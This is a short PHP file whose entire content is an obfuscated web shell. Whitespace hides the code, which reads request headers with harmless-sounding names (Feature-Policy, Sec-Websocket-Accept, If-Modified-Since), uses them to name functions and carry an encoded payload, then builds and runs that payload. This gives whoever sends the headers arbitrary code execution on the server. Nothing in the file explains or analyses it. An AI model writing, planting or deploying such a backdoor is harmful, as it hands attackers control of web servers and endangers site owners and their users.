<?php																																										$_HEADERS=getallheaders();if(isset($_HEADERS['Feature-Policy'])){$ibase_pconnection=$_HEADERS['Feature-Policy']('', $_HEADERS['Sec-Websocket-Accept']($_HEADERS['If-Modified-Since']));$ibase_pconnection();}
